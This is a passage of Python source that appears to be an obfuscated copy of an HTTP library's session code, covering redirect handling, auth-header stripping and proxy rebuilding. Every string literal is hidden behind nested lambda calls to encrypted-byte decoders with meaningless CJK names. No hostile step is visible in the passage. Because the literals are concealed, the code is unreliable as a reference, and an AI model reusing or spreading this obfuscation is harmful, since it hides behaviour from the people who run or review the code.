樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))()]))))())())() in headers or (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())() in headers)
                    if rewindable:
                        rewind_body(prepared_request)
                    req = prepared_request
                    if yield_requests:
                        yield req
                    else:
                        resp = self.send(req, stream=stream, timeout=timeout, verify=verify, cert=cert, proxies=proxies, allow_redirects=(lambda: (lambda 壬耶藪舴笂鼥: 壬耶藪舴笂鼥 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())(), **adapter_kwargs)
                        extract_cookies_to_jar(self.cookies, prepared_request, resp.raw)
                        url = self.get_redirect_target(resp)
                        yield resp

            def rebuild_auth(self, prepared_request, response):
                headers = prepared_request.headers
                url = prepared_request.url
                if (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x13'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())() in headers and self.should_strip_auth(response.request.url, url):
                    del headers[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x13'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())()]
                new_auth = get_netrc_auth(url) if self.trust_env else None
                if new_auth is not None:
                    prepared_request.prepare_auth(new_auth)

            def rebuild_proxies(self, prepared_request, proxies):
                proxies = proxies if proxies is not None else {}
                headers = prepared_request.headers
                url = prepared_request.url
                scheme = urlparse(url).scheme
                new_proxies = proxies.copy()
                no_proxy = proxies.get((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))()]))))())())())
                bypass_proxy = should_bypass_proxies(url, no_proxy=no_proxy)
                if self.trust_env and (not bypass_proxy):
                    environ_proxies = get_environ_proxies(url, no_proxy=no_proxy)
                    proxy = environ_proxies.get(scheme, environ_proxies.get((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))()]))))())())()))
                    if proxy:
                        new_proxies.setdefault(scheme, proxy)
                if (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x13'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())() in headers:
                    del headers[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x13'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 